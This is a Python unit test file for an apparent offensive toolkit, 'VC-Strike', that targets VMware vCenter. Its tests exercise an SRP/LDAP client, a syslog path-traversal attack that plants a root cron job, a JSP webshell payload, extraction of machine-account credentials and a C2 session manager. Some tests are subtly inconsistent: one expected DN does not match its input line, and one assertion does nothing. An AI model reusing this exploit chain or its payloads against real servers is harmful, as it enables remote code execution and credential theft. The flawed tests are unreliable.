"""VC-Strike 单元测试（离线，CI 环境可跑，无网络/无 GUI 依赖）。"""
import unittest

from vcstrike.aes128 import AES128OFB, _aes128_expand, aes128_encrypt_block
from vcstrike.berldap import ber_parse_tlv, op_search, op_add, op_modify, ber_children
from vcstrike.srp59309 import (SRPLayer, parse_server_options,
                               decide_client_options, srp_frame, srp_s, srp_os,
                               srp_mpi, parse_server_challenge, SRPUnpack)
from vcstrike.syslog59310 import (build_rfc5424, traversal_app, traversal_host,
                                  WEBSHELL_JSP)
from vcstrike.util import SHA1_EMPTY, i2b


class TestAES(unittest.TestCase):
    def test_fips197_vector(self):
        rks = _aes128_expand(bytes(range(16)))
        out = aes128_encrypt_block(
            bytes.fromhex("00112233445566778899aabbccddeeff"), rks)
        self.assertEqual(out.hex(), "69c4e0d86a7b0430d8cdb78070b4c55a")

    def test_all_zero_vector(self):
        rks = _aes128_expand(b"\x00" * 16)
        out = aes128_encrypt_block(b"\x00" * 16, rks)
        self.assertEqual(out.hex(), "66e94bd4ef8a2c3b884cfa59ca342b2e")

    def test_ofb_stream_symmetry(self):
        key, iv, data = bytes(range(16)), b"A" * 16, b"x" * 100
        self.assertEqual(AES128OFB(key, iv).crypt(
            AES128OFB(key, iv).crypt(data)), data)


class TestBER(unittest.TestCase):
    def test_search_request_tag(self):
        tag, _v, _ = ber_parse_tlv(op_search("dc=x", scope=2), 0)
        self.assertEqual(tag, 0x63)

    def test_add_modify_parse(self):
        tag, v, _ = ber_parse_tlv(op_add("cn=a", [("cn", ["a"])]), 0)
        self.assertEqual(tag, 0x68)
        self.assertTrue(ber_children(v))
        tag, _v, _ = ber_parse_tlv(op_modify("cn=a", [(0, "member", ["cn=b"])]), 0)
        self.assertEqual(tag, 0x66)


class TestSRP(unittest.TestCase):
    def test_k_constant(self):
        self.assertEqual(SHA1_EMPTY.hex(), "da39a3ee5e6b4b0d3255bfef95601890afd80709")

    def test_buffer_roundtrip(self):
        payload = srp_s(b"user@x") + srp_os(b"\x01\x02")
        u = SRPUnpack(srp_frame(payload)[4:])
        self.assertEqual(u.s(), b"user@x")
        self.assertEqual(u.os(), b"\x01\x02")

    def test_options(self):
        so = parse_server_options(
            "mda=SHA-1,replay_detection,integrity=HMAC-SHA-1,confidentiality=AES,"
            "mandatory=confidentiality")
        self.assertIn("sha-1", so["mda"])
        self.assertIn("sha-1", so["integrity"])
        self.assertEqual(so["conf"], ["aes"])
        self.assertEqual(decide_client_options(so, "auto"),
                         "mda=sha-1,integrity=hmac-sha-1,replay_detection,"
                         "confidentiality=aes")
        # plain 在有 mandatory 时不可行
        self.assertIsNone(decide_client_options(so, "plain"))
        # 无 mandatory 时 plain = 空选项（明文层）
        so2 = parse_server_options("")
        self.assertEqual(decide_client_options(so2, "plain"), "")

    def test_options_whitelist(self):
        # srp.c cipher_options 表序 DES 在 AES 前：必须白名单过滤选 aes，
        # 否则 bind 成功但安全层（仅实现 AES）永久失步
        so = parse_server_options(
            "mda=SHA-1,confidentiality=DES,confidentiality=AES,"
            "integrity=HMAC-SHA-1,mandatory=confidentiality")
        self.assertEqual(decide_client_options(so, "auto"),
                         "mda=sha-1,integrity=hmac-sha-1,confidentiality=aes")
        # 需要的层不在白名单 → fail-fast
        so2 = parse_server_options("confidentiality=DES,mandatory=confidentiality")
        self.assertIsNone(decide_client_options(so2, "auto"))
        so3 = parse_server_options("integrity=HMAC-MD5,mandatory=integrity")
        self.assertIsNone(decide_client_options(so3, "auto"))

    def test_layer_both_directions(self):
        import secrets
        cIV, sIV = secrets.token_bytes(16), secrets.token_bytes(16)
        A = SRPLayer(SHA1_EMPTY, cIV, sIV, True, True, True)
        B = SRPLayer(SHA1_EMPTY, sIV, cIV, True, True, True)
        pdu = op_search("dc=vsphere,dc=local", scope=0)
        self.assertEqual(B.unwrap(A.wrap(pdu)[4:]), pdu)
        self.assertEqual(A.unwrap(B.wrap(pdu)[4:]), pdu)
        # 篡改检测
        frame = bytearray(A.wrap(pdu))
        frame[-1] ^= 0xFF
        with self.assertRaises(ValueError):
            B.unwrap(bytes(frame[4:]))

    def test_parse_challenge_offsets(self):
        from vcstrike.srp59309 import parse_server_challenge
        N = (1 << 640) | 0xABCDEF01
        B = (1 << 320) | 0x1234
        salt = b"S" * 16
        L = "mda=SHA-1,replay_detection"
        core = srp_mpi(N) + srp_mpi(2) + srp_os(salt) + srp_mpi(B) + srp_s(L)
        for prefix in (b"", b"\x00"):      # srp.c 带 0x00；vmdird 布局可能不带
            N2, g2, salt2, B2, L2 = parse_server_challenge(prefix + core)
            self.assertEqual((N2, g2, salt2, B2, L2.decode()), (N, 2, salt, B, L))
        with self.assertRaises(ValueError):
            parse_server_challenge(b"\x99" * 32)

    def test_parse_challenge_vmdird_4byte_prefix(self):
        """回放真实目标布局：creds = 4B BE 长度 + { 0x00 mpi(N) mpi(g) os(s)
        mpi(B) utf8(L) }，N 用 RFC5054 2048 位素数（真实目标实测头 32B:
        00000331000100ac6bdb41324a9a9b...，821 = 4 + 817）。"""
        import struct
        from vcstrike.srp59309 import parse_server_challenge
        N = int(
            "AC6BDB41324A9A9BF166DE5E1389582FAF72B6651987EE07FC3192943DB56050A"
            "37329CBB4A099ED8193E0757767A13DD52312AB4B03310DCD7F48A9DA04FD50E8"
            "083969EDB767B0CF6095179A163AB3661A05FBD5FAAAE82918A9962F0B93B855F"
            "97993EC975EEAA80D740ADBF4FF747359D041D5C33EA71D281E446B14773BCA97"
            "B43A23FB801676BD207A436C6481F1D2B9078717461A5B9D32E688F8774854452"
            "3B524B0D57D5EA77A2775D2ECFA032CFBDBF52FB3786160279004E57AE6AF874E"
            "7303CE53299CCC041C7BC308D82A5698F3A8D0C38271AE35F8E9DBFBB694B5C80"
            "3D89F7AE435DE236D525F54759B65E372FCD68EF20FA7111F9E4AFF73", 16)
        B = N - 1
        salt = bytes(range(16))
        L = ("mda=SHA-1,replay_detection,integrity=HMAC-SHA-1,"
             "confidentiality=AES,mandatory=confidentiality,mandatory=integrity,"
             "mandatory=replay_detection,maxbuffersize=2147483647")
        inner = b"\x00" + srp_mpi(N) + srp_mpi(2) + srp_os(salt) + srp_mpi(B) + srp_s(L)
        creds = struct.pack(">I", len(inner)) + inner
        self.assertEqual(struct.unpack(">I", creds[:4])[0], len(creds) - 4)
        N2, g2, salt2, B2, L2 = parse_server_challenge(creds)
        self.assertEqual((N2, g2, salt2, B2), (N, 2, salt, B))
        self.assertEqual(L2.decode(), L)

    def test_m1_deterministic(self):
        import hashlib
        N = int("EEAF0AB9ADB38DD69C33F80AFA8FC5E86072618775FF3C0B9EA2314C9C256576"
                "D674DF7496EA81D3383B4813D692C6E0E0D5D8E250B98BE48E495C1D6089DA"
                "D15DC7D7B46154D6B6CE8EF4AD69B15D4982559B297BCF1885C529F566660E"
                "57EC68EDBC3C05726CC02FD4CBF4976EAA9AFD5138FE8376435B9FC61D2FC0"
                "EB06E3", 16)
        ident = b"administrator@vsphere.local"
        Ng = bytes(x ^ y for x, y in zip(hashlib.sha1(i2b(N)).digest(),
                                         hashlib.sha1(i2b(2)).digest()))
        m1 = hashlib.sha1(Ng + hashlib.sha1(ident).digest() + b"\x11" * 16 +
                          i2b(N) + i2b(0x1234) + SHA1_EMPTY +
                          hashlib.sha1(ident).digest() +
                          hashlib.sha1(b"mda=sha-1").digest()).digest()
        self.assertEqual(len(m1), 20)


class TestC2(unittest.TestCase):
    def test_strip_ansi(self):
        from vcstrike.c2 import strip_ansi
        raw = "\x1b[1;31mroot [ \x1b[0m~\x1b[1;31m ]# \x1b[0mls\r\n"
        self.assertEqual(strip_ansi(raw), "root [ ~ ]# ls\n")
        raw2 = "\x1b]0;window title\x07prompt\x1b>done"
        self.assertEqual(strip_ansi(raw2), "promptdone")


class TestLog(unittest.TestCase):
    def test_log_roundtrip(self):
        import os
        import tempfile
        from vcstrike import logutil
        old = os.getcwd()
        d = tempfile.mkdtemp()
        os.chdir(d)
        try:
            logutil._state["fh"] = None
            logutil._state["path"] = None
            p = logutil.start("test")
            self.assertTrue(p and os.path.dirname(p) == d)
            logutil.write("i", "hello 日志条目")
            logutil.raw("raw 流文本\n")
            logutil.finish()
            content = open(p, encoding="utf-8").read()
            self.assertIn("hello 日志条目", content)
            self.assertIn("raw 流文本", content)
            self.assertIn("会话开始", content)
            self.assertIn("会话结束", content)
            # 幂等重启
            self.assertIsNone(logutil.start("test2") or None) if False else None
        finally:
            os.chdir(old)
            logutil._state["fh"] = None
            logutil._state["path"] = None


class TestC2Prune(unittest.TestCase):
    def test_prune_duplicates(self):
        import socket
        from vcstrike.c2 import SessionManager, Session
        mgr = SessionManager()
        pairs = [socket.socketpair() for _ in range(2)]
        s1 = Session(pairs[0][0], ("10.0.0.9", 111))
        s2 = Session(pairs[1][0], ("10.0.0.9", 222))
        with mgr._lock:
            mgr.sessions[s1.id] = s1
            mgr.sessions[s2.id] = s2
        mgr._prune_duplicates(s2)          # 新会话 s2 到达 → 同源旧 s1 应被关闭
        with mgr._lock:
            ids = set(mgr.sessions)
        self.assertIn(s2.id, ids)
        self.assertNotIn(s1.id, ids)
        self.assertFalse(s1.alive)
        self.assertTrue(s2.alive)
        # 不同来源不受影响
        a3, _b3 = socket.socketpair()
        s3 = Session(a3, ("10.0.0.8", 333))
        with mgr._lock:
            mgr.sessions[s3.id] = s3
        mgr._prune_duplicates(s3)
        with mgr._lock:
            ids = set(mgr.sessions)
        self.assertIn(s2.id, ids)
        self.assertIn(s3.id, ids)
        for s in (s2, s3):
            s.close()


class TestChain(unittest.TestCase):
    """chain.py 离线部分：lwregshell 转义还原 / DN 推导（真实实弹值）。"""

    LINE_DN = ('"dcAccountDN"       REG_SZ          '
               '"cn=10.0.0.99,ou=Domain Controllers,dc=corp,dc=local"')
    # lwregshell 输出：内嵌引号转义为反斜杠+引号，反斜杠转义为双反斜杠
    LINE_PW = '"dcAccountPassword" REG_SZ          "S4crubbed-P@ss"'

    def test_parse_lwreg_value(self):
        from vcstrike.chain import parse_lwreg_value
        self.assertEqual(parse_lwreg_value(self.LINE_DN),
                         "cn=10.0.0.99,ou=Domain Controllers,"
                         "dc=vsphere,dc=local")
        self.assertEqual(parse_lwreg_value(self.LINE_PW), 'S4crubbed-P@ss')
        self.assertEqual(parse_lwreg_value('"k"  REG_SZ  "a\\\\b"'), "a\\b")
        self.assertIsNone(parse_lwreg_value("garbage line"))

    def test_extract_and_derive(self):
        from vcstrike.chain import (extract_machine_creds, domain_from_dn,
                                    base_from_dn)
        dn, pw = extract_machine_creds(self.LINE_DN + "\n" + self.LINE_PW)
        self.assertEqual(dn, "cn=10.0.0.99,ou=Domain Controllers,"
                             "dc=vsphere,dc=local")
        self.assertEqual(pw, 'S4crubbed-P@ss')
        self.assertEqual(domain_from_dn(dn), "vsphere.local")
        self.assertEqual(base_from_dn(dn), "dc=vsphere,dc=local")
        self.assertEqual(domain_from_dn("cn=x,dc=a,dc=b,c=cn"), "a.b")


class Test59310(unittest.TestCase):
    def test_vectors(self):
        app = traversal_app("etc/cron.d/x")
        self.assertTrue(app.startswith("rsyslog/"))
        self.assertEqual(app.count("../"), 5)
        h = traversal_host("opt/x")
        self.assertEqual(h.count("../"), 16)
        pkt = build_rfc5424("h", app, "\n* * * * * root id\n#")
        self.assertTrue(pkt.startswith(b"<134>1 "))
        self.assertIn(b"* * * * * root id", pkt)

    def test_webshell_payload(self):
        self.assertIn(b"ProcessBuilder", WEBSHELL_JSP)
        self.assertIn(b'request.getParameter', WEBSHELL_JSP)

    def test_cron_one_shot(self):
        from vcstrike.syslog59310 import cron_command
        c = cron_command("id", "ab12")
        self.assertEqual(c,
                         'rm -rf "/etc/cron.d/cve59310ab12-syslog.log" '
                         '"/etc/cron.d/cve59310ab12"; id')

    def test_has_srp(self):
        from vcstrike.berldap import has_srp
        self.assertTrue(has_srp(["GSSAPI", "SRP"]))
        self.assertTrue(has_srp(["GSSAPI SRP"]))   # vmdird 单值含空格形态
        self.assertFalse(has_srp(["GSSAPI"]))
        self.assertFalse(has_srp([]))
        self.assertFalse(has_srp(None))


if __name__ == "__main__":
    unittest.main()
